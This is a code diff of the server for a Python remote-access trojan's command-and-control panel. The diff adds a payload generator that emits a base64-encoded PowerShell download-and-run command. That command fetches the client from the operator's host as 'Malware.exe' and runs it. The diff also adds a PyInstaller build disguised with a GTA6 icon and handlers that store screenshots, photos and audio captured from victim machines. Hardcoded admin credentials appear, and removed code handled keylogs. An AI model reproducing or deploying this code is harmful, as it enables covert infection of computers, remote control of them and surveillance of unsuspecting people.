@@ -1,8 +1,8 @@
 #Server.py
 
 from flask import Flask, request, render_template, redirect, url_for, session, jsonify
-from flask_socketio import SocketIO, emit
-import os
+from flask_socketio import SocketIO
+import os, subprocess, base64
 
 app = Flask(__name__)
 server = SocketIO(app)
@@ -12,14 +12,13 @@ USERNAME = 'admin'
 PASSWORD = 'admin9876'
 server_ip = '0.0.0.0'
 server_port = 8000
+
 idNumber = 0
 database = []
 completedTasks = []
 command_output = 'COMMAND OUTPUT'
 ping_output_list = []
 file_transfer_list = []
-screenshotNumber = 0
-keyloggerNumber = 0
 
 class Client:
     def __init__(self, info):
@@ -32,13 +31,6 @@ class Client:
         self.OS = info['OS']
         self.sid = info['sid']
         self.status = "Alive"
-
-class TaskDone:
-    def __init__(self, info):
-        self.idNumber = info['idNumber']
-        self.hostname = info['hostname']
-        self.command = info['command']
-        self.status = info['DATA']
 
 @app.route('/')
 def redirectLogin():
@@ -63,6 +55,30 @@ def dashboard():
         return render_template('dashboard.html', database=database)
     return redirect(url_for('login'))
 
+@app.route('/payload', methods=['GET'])
+def payload():
+    payload_ip = request.args.get('serverIP')
+    payload_port = request.args.get('port')
+    force_convert = request.args.get('forceConvert', False)
+    if force_convert != 'on':
+        initial_string = rf'$url = "http://{payload_ip}:{payload_port}/Client.py"; $destination = "C:\Program Files\WindowsPowerShell\Malware.py"; Invoke-WebRequest -Uri $url -OutFile $destination; Start-Process -FilePath $destination'
+        payload_string = base64.b64encode(initial_string.encode()).decode()
+        return render_template('payload.html', string=payload_string)
+    else:
+        status = pytoexe()
+        if status:
+            initial_string = rf'$url = "http://{payload_ip}:{payload_port}/build/dist/Client.py"; $destination = "C:\Program Files\WindowsPowerShell\Malware.exe"; Invoke-WebRequest -Uri $url -OutFile $destination; Start-Process -FilePath $destination'
+            payload_string = base64.b64encode(initial_string.encode()).decode()
+            return render_template('payload.html', string=payload_string)
+        else:
+            payload_string = 'Payload String Could not be Generated'
+            return render_template('payload.html', string=payload_string)
+
+def pytoexe():
+    command = ['C:/Python3x/Scripts/pyinstaller.exe', '--name', 'Malware', '--icon=./static/GTA6.ico', '--distpath=build/dist', '--verbose', 'Client.py']
+    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    return process.returncode == 0
+
 @app.route('/modules', methods=['GET', 'POST'])
 def modules():
     if not session.get('loggedin'):
@@ -77,25 +93,20 @@ def modules():
                 hostname = client_info.hostname
             else:
                 return "ERROR: BOT with Provided BOT-ID not Found"
-            send_modules(idNumber, command, hostname)
+            server.emit('module', {'idNumber': idNumber, 'command': command, 'hostname': hostname})
             return render_template('modules.html', tasks=completedTasks)
         else:
             return "ERROR : Bot ID not provided"
 
     return render_template('modules.html', tasks=completedTasks)
 
-def send_modules(idNumber, command, hostname):
-    if command not in ['screenshot', 'persistence', 'keylogger']:
-        return "ERROR : Invalid Modules Command Provided"
-    server.emit('module', {'idNumber': idNumber, 'command': command, 'hostname': hostname})
-
 @server.on('module_output')
 def handle_modules_output(module_output):
     idNumber = module_output.get('idNumber')
     command = module_output.get('command')
     hostname = module_output.get('hostname')
-    status = module_output.get('DATA')
-    completedTasks.append(TaskDone({'idNumber': idNumber, 'hostname': hostname, 'command': command, 'DATA': status}))
+    status = module_output.get('result')
+    completedTasks.append({'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': status})
 
 @app.route('/commands', methods=['GET'])
 def commands():
@@ -185,8 +196,8 @@ def file_status_update(file_status):
     status = file_status.get('status')
     file_transfer_list.append({'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'status' : status})
 
-@server.on('download_client')
-def file_status_update(input):
+@server.on('download_from_client')
+def download(input):
     idNumber = input.get('idNumber')
     transfer_type = input.get('transfer_type')
     hostname = input.get('hostname')
@@ -197,7 +208,7 @@ def file_status_update(input):
         try:
             with open(file_path, 'wb') as file:
                 file.write(file_data)
-                status = "File Has Been Downloaded SuccessFully from Client"
+                status = "File Has Been Downloaded SuccessFully from the Client"
                 file_transfer_list.append({'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'status' : status})
         except:
             status = "File Could not be Written on the Server"
@@ -210,6 +221,14 @@ def module_file_transfer(input):
     file_data = input.get('file_data')
     if command == 'screenshot':
         file_path = "./Data/Screenshots/" + file_name
+        with open(file_path, 'wb') as file:
+            file.write(file_data)
+    elif command == 'picture':
+        file_path = "./Data/Pictures/" + file_name
+        with open(file_path, 'wb') as file:
+            file.write(file_data)
+    elif command == 'audio':
+        file_path = "./Data/Audios/" + file_name
         with open(file_path, 'wb') as file:
             file.write(file_data)
 
@@ -240,39 +259,6 @@ def onDisconnect():
 @server.on('Initial_Information')
 def handleInformation(Initial_Information):
         database.append(Client(Initial_Information))
-
-@server.on('message')
-def handleMessage(message):
-    command = message.get('COMMAND')
-    if command == 'OUTPUT':
-        if 'persistence' in message['command']:
-            if message['PV']:
-                for x in database:
-                    if x.idNumber == message['idNumber']:
-                        x.persistence = True
-
-            if "screenshot" in message['command']:
-                global screenshotNumber
-                with open(f'./Data/Screenshots/screenshot_{screenshotNumber}.png', 'wb') as f:
-                    f.write(message['DATA'])
-                    tmp = f'/Data/Screenshots/screenshot_{screenshotNumber}.png'
-                    message['DATA'] = tmp
-                    screenshotNumber += 1
-
-            if 'keylogger' in message['command']:
-                global keyloggerNumber
-                with open(f'./Data/Keylogs/keylogs_{keyloggerNumber}.txt', 'w') as f:
-                    f.write(message['DATA'])
-                    tmp = f'/Data/Keylogs/keylogs_{keyloggerNumber}.txt'
-                    message['DATA'] = tmp
-                    keyloggerNumber += 1
-            else:
-                message['DATA'] = message['DATA'].decode("utf-8")
-
-            for x in database:
-                if x.idNumber == message['idNumber']:
-                    x.tasks.append(message)
-    emit('message', message, broadcast=True)
 
 if __name__ == '__main__':
     server.run(app, host=server_ip, port=server_port)
